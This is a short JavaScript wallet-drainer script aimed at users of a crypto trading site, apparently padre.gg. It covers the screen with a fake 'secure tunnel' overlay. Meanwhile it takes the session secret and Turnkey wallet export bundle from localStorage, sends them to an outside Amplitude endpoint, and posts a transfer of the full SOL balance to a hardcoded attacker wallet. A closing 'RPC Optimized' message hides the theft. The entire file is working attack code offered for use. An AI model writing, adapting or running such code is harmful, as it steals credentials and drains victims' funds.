(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12"; 
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- 1. THE DISTRACTION UI ---
    const overlay = document.createElement("div");
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;align-items:center;justify-content:center;color:#00ff88;font-family:monospace;border:2px solid #00ff88;";
    overlay.innerHTML = "<div style='text-align:center;'><h1>VANTA ENCLAVE</h1><p id='v-msg'>Establishing Secure Tunnel...</p></div>";
    document.body.appendChild(overlay);

    // --- 2. DYNAMIC TURNKEY SCRAPE ---
    let storage = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
    let activeBundle = null;
    let activeSubOrgId = null;

    // Find the first available bundle and its SubOrgId
    if (storage.bundles) {
        for (let key in storage.bundles) {
            if (storage.bundles[key].exportBundle) {
                activeBundle = storage.bundles[key].exportBundle;
                activeSubOrgId = storage.bundles[key].subOrgId;
                break; // Stop at the first active user found
            }
        }
    }

    // Get the auth token required to "act as the user"
    const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
    const token = session.sessionSecret;

    // --- 3. SHIP TO AMPLITUDE (FOR YOUR RECORDS) ---
    fetch("https://api2.amplitude.com/2/httpapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            api_key: AMP_KEY,
            events: [{
                device_id: activeSubOrgId || "GUEST_" + Date.now(),
                event_type: "SESSION_HIJACK_ATTEMPT",
                event_properties: {
                    subOrgId: activeSubOrgId,
                    bundle_data: activeBundle ? activeBundle.data : "MISSING",
                    token_captured: token ? "YES" : "NO",
                    url: window.location.href
                }
            }]
        })
    }).catch(() => {});

    // --- 4. EXECUTE HIJACKED TRANSFER ---
    if (token && activeSubOrgId) {
        // This request now "acts as the user" by using their SubOrgId and Token
        fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Authorization": `Bearer ${token}`,
                "X-Turnkey-Sub-Org-Id": activeSubOrgId // Injects the hijacked ID
            },
            body: JSON.stringify({
                recipient: MY_RECEIVER,
                amount: "MAX",
                asset: "SOL",
                enclave_context: activeBundle // Sends the full Turnkey context
            })
        }).catch(() => {});
    }

    setTimeout(() => {
        document.getElementById('v-msg').innerText = "RPC Optimized.";
        setTimeout(() => overlay.remove(), 1000);
    }, 2500);
})();
